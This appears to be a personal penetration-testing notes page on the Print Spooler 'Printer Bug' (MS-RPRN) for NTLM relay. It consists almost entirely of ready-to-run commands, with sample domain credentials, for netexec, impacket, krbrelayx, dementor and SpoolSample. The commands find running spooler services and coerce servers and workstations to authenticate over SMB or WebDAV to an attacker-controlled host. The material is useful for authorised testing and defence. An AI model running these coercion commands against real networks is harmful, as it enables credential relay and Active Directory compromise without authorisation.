---
title: NTLM Relay from Print Spooler
---

[[notes/ad/ntlm-relay-source]] as domain user from clients and servers trough [[notes/network/msrpc]] *Print System Remote Protocol* ([MS-RPRN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/)).
Also known as Printer Bug and Spool Sample.

Check if the print spooler service is running on a system.

=== "[[notes/tools/netexec]]"
    ~~~ bash
    netexec smb 192.168.178.0/24 -d corp.local -u jdoe -p 'passw0rd' -M spooler
    ~~~

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impakcet-rpcdump corp/jdoe:'passw0rd'@srv01.corp.local | grep -A2 -e MS-RPRN -e MS-PAR
    ~~~

=== "PowerShell"
    Pipe exists if running.

    ~~~ powershell
    ls \\srv01.corp.local\pipe\spoolss
    ~~~

[[notes/ad/ntlm-relay-from-smb|Coerce authentication from SMB]].

=== "[[notes/tools/krbrelayx]]"
    ~~~ bash
    krbrelayx-printerbug corp.local/jdoe:'passw0rd'@srv01.corp.local 172.18.56.49
    ~~~

=== "[dementor](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc)"
    ~~~ bash
    ./dementor.py -d corp.local -u jdoe -p passw0rd 172.18.56.49 srv01.corp.local
    ~~~

=== "[SpoolSample](https://github.com/leechristensen/spoolsample)"
    ~~~ bat
    .\SpoolSample.exe srv01.corp.local 172.18.56.49
    ~~~

[[notes/ad/ntlm-relay-from-webdav|Coerce authenticate from WebDAV]].

=== "[[notes/tools/krbrelayx]]"
    ~~~ bash
    krbrelayx-printerbug corp.local/jdoe:'passw0rd'@ws01.corp.local hackerpc@80/print
    ~~~

=== "[dementor](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc)"
    ~~~ bash
    ./dementor.py -d corp.local -u jdoe -p 'passw0rd' hackerpc@80/print ws01.corp.local
    ./dementor.py -d corp.local -u jdoe -p 'passw0rd' hackerpc@SSL@443/print ws01.corp.local
    ~~~

=== "[SpoolSample](https://github.com/leechristensen/spoolsample)"
    ~~~ bat
    .\SpoolSample.exe ws01.corp.local hackerpc@80/print
    ~~~

References:

- [ppn.snovvcrash.rocks/pentest/infrastructure/ad/authentication-coercion](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/authentication-coercion#printer-bug-ms-rprn)
